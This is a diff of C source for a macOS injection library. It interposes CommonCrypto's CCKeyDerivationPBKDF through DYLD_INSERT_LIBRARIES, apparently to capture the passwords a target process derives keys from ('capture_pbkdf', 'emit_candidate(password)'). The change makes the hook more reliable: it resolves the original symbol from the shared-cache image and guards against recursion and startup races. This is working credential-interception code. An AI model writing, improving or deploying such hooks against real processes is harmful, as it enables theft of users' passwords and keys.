@@ -13,6 +13,8 @@
 #include <dlfcn.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <mach-o/dyld.h>
+#include <pthread.h>
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
@@ -36,12 +38,68 @@ typedef int (*pbkdf_fn)(
     uint8_t *,
     size_t);
 
+static int capture_pbkdf(
+    CCPBKDFAlgorithm,
+    const char *,
+    size_t,
+    const uint8_t *,
+    size_t,
+    CCPseudoRandomAlgorithm,
+    uint,
+    uint8_t *,
+    size_t);
+
+static pthread_once_t original_once = PTHREAD_ONCE_INIT;
+static pbkdf_fn original_pbkdf = NULL;
+
+static void *common_crypto_symbol_address(void) {
+    static const char image_suffix[] = "/usr/lib/system/libcommonCrypto.dylib";
+    uint32_t image_count = _dyld_image_count();
+    for (uint32_t index = 0; index < image_count; ++index) {
+        const char *name = _dyld_get_image_name(index);
+        if (name == NULL) continue;
+        size_t name_len = strlen(name);
+        size_t suffix_len = sizeof(image_suffix) - 1;
+        if (name_len < suffix_len ||
+            strcmp(name + name_len - suffix_len, image_suffix) != 0) {
+            continue;
+        }
+        const struct mach_header *header = _dyld_get_image_header(index);
+        if (header == NULL) return NULL;
+#pragma clang diagnostic push
+#pragma clang diagnostic ignored "-Wdeprecated-declarations"
+        NSSymbol symbol = NSLookupSymbolInImage(
+            header,
+            "_CCKeyDerivationPBKDF",
+            NSLOOKUPSYMBOLINIMAGE_OPTION_BIND |
+                NSLOOKUPSYMBOLINIMAGE_OPTION_RETURN_ON_ERROR);
+        void *address = symbol == NULL ? NULL : NSAddressOfSymbol(symbol);
+#pragma clang diagnostic pop
+        return address;
+    }
+    return NULL;
+}
+
+static void resolve_original_once(void) {
+    /*
+     * In a DYLD_INSERT_LIBRARIES process on current macOS, RTLD_NEXT can still
+     * resolve this interposed CommonCrypto export back to the replacement.  An
+     * unchecked forward then recurses until the target crashes.  Prefer the
+     * symbol exported by the concrete shared-cache image and retain Apple's
+     * documented RTLD_NEXT lookup only as a guarded fallback.  Resolve once so
+     * concurrent startup KDF calls cannot race the forwarding target.
+     */
+    void *symbol = common_crypto_symbol_address();
+    if (symbol == NULL) {
+        symbol = dlsym(RTLD_NEXT, "CCKeyDerivationPBKDF");
+    }
+    if (symbol != NULL) memcpy(&original_pbkdf, &symbol, sizeof(original_pbkdf));
+    if (original_pbkdf == capture_pbkdf) original_pbkdf = NULL;
+}
+
 static pbkdf_fn resolve_original(void) {
-    static pbkdf_fn original = NULL;
-    if (original != NULL) return original;
-    void *symbol = dlsym(RTLD_NEXT, "CCKeyDerivationPBKDF");
-    if (symbol != NULL) memcpy(&original, &symbol, sizeof(original));
-    return original;
+    if (pthread_once(&original_once, resolve_original_once) != 0) return NULL;
+    return original_pbkdf;
 }
 
 static void emit_candidate(const char *password) {
